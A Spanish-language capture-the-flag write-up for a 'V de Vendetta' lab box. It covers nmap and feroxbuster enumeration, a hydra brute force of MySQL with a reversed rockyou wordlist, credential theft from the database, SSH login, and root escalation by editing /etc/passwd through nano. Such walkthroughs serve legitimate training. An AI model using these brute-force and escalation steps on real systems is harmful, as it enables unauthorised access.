# Enumeracion de Puertos, Servicios y Versiones

```ruby
nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.17.0.2 -oN nmap
```
```css
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-07 21:36 -03
Nmap scan report for 172.17.0.2
Host is up (0.0000040s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 fa:66:3d:c0:de:2c:1a:25:f8:fc:10:8a:5c:e9:d2:ba (ECDSA)
|_  256 45:89:84:f6:20:34:a6:7a:2e:1e:07:24:ac:ce:d0:67 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: V de Vendetta
|_http-server-header: Apache/2.4.58 (Ubuntu)
3306/tcp open  mysql   MySQL 5.5.5-10.11.8-MariaDB-0ubuntu0.24.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.11.8-MariaDB-0ubuntu0.24.04.1
|   Thread ID: 35
|   Capabilities flags: 63486
|   Some Capabilities: ConnectWithDatabase, LongColumnFlag, Support41Auth, SupportsLoadDataLocal, IgnoreSigpipes, SupportsCompression, Speaks41ProtocolOld, ODBCClient, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, FoundRows, InteractiveClient, SupportsTransactions, Speaks41ProtocolNew, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: L7j5f#uKSB.]l'wHAK7o
|_  Auth Plugin Name: mysql_native_password
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.44 seconds
```
comienzo chequeando el servicio web

![Screenshot From 2024-11-07 21-38-52](https://github.com/user-attachments/assets/395306b0-cb8e-45d9-b80d-a184e4de6a12)

nada en su codigo, asi que le hago fuzzing 

```ruby
feroxbuster -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -s 200,301,302 -x txt,php,bak,db,py,html,js,jpg,png,git -t 200 -d 10 --random-agent --no-state
```
```css
___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://172.17.0.2
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ [200, 301, 302]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, bak, db, py, html, js, jpg, png, git]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 10
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       91l      501w    42470c http://172.17.0.2/mascara.jpg
200      GET      144l      851w    62906c http://172.17.0.2/rose.jpg
200      GET       76l      157w     1953c http://172.17.0.2/
200      GET       76l      157w     1953c http://172.17.0.2/index.html
```
nada de interes por aqui, no se utiliza esteganografia en las imagenes y no veo nada mas que me pueda servir...
lo unico llamativo es el mensaje de `"si sabes su nombre sabes todo"` y a lo que mas hace referencia la web es a la mascara de Guy Fawkes, es decir, la mascara
de Vendetta... sin embargo lo que se resalta en esta web es la `V` y tengo 2 servicios mas, `mysql y ssh` asi que despues de intentar de varias maneras logre
acceder al servicio mysql de la siguiente manera:

1) modificando un poco el diccionario rockyou, primero invirtiendolo y luego eliminando los caracteres especiales de este

   ```ruby
   tac /usr/share/wordlists/rockyou.txt > wordlist
   ```
   ```ruby
   nano wordlist
   ```
   ![Screenshot From 2024-11-07 21-55-14](https://github.com/user-attachments/assets/1936b6a6-5f61-4dc0-9bda-5a3a5be67e49)

   aqui elimino los caracteres en color `naranja` quedando:

   ![Screenshot From 2024-11-07 21-56-46](https://github.com/user-attachments/assets/1d332b6d-5ae4-4beb-a69c-227f00626e13)


2) pasando este diccionario modificado a hydra contra el servicio mysql
   ```ruby
   hydra -l V -P wordlist mysql://172.17.0.2 -f
   ```
   ```css
   Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

   Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-07 22:02:47
   [INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
   [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
   [DATA] max 4 tasks per 1 server, overall 4 tasks, 14344403 login tries (l:1/p:14344403), ~3586101 tries per task
   [DATA] attacking mysql://172.17.0.2:3306/
   [3306][mysql] host: 172.17.0.2   login: V   password: ie168
   [STATUS] attack finished for 172.17.0.2 (valid pair found)
   1 of 1 target successfully completed, 1 valid password found
   Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-07 22:02:59
   ```

3) Conexion a la mysql

   ```ruby
   mysql -h 172.17.0.2 -u V -pie168
   ```
   ```css
   ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it
   ```
   me lanza este error pero esto ocurre porque automaticamente el ssl esta activado, asi que lo deshabilito con `--skip-ssl` quedando:

   ```ruby
   mysql -h 172.17.0.2 -u V -pie168 --skip-ssl
   ```
   ```css
   Welcome to the MariaDB monitor.  Commands end with ; or \g.
   Your MariaDB connection id is 44
   Server version: 10.11.8-MariaDB-0ubuntu0.24.04.1 Ubuntu 24.04

   Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

   Support MariaDB developers by giving a star at https://github.com/MariaDB/server
   Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

   MariaDB [(none)]> show databses;
   ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'databses' at line 1
   MariaDB [(none)]> show databases;
   +--------------------+
   | Database           |
   +--------------------+
   | BTN                |
   | information_schema |
   | mysql              |
   | performance_schema |
   | sys                |
   +--------------------+
   5 rows in set (0.001 sec)

   MariaDB [(none)]> use BTN;
   Reading table information for completion of table and column names
   You can turn off this feature to get a quicker startup with -A

   Database changed
   MariaDB [BTN]> show tables;
   +---------------+
   | Tables_in_BTN |
   +---------------+
   | users         |
   +---------------+
   1 row in set (0.001 sec)

   MariaDB [BTN]> select * from users;
   +----+----------+-----------+
   | id | user     | password  |
   +----+----------+-----------+
   |  1 | Vendetta | OldBailey |
   +----+----------+-----------+
   1 row in set (0.001 sec)
   ```
aqui he conseguido credenciales, asi que las probare contra el servicio ssh

```ruby
ssh Vendetta@172.17.0.2
```
y logro el acceso como el user `Vendetta`

# Escalada de Privilegios
### Vendetta

![Screenshot From 2024-11-07 22-22-31](https://github.com/user-attachments/assets/9a4b506f-a69a-4cbb-9001-5b47a1251dcc)

la escalada consistio en editar el archivo /etc/password eliminando la `x` de la linea de root haciendo uso del binario `/usr/bin/nano` que es un editor de texto
con permisos de ejecucion como root y asi logre la escalada

   















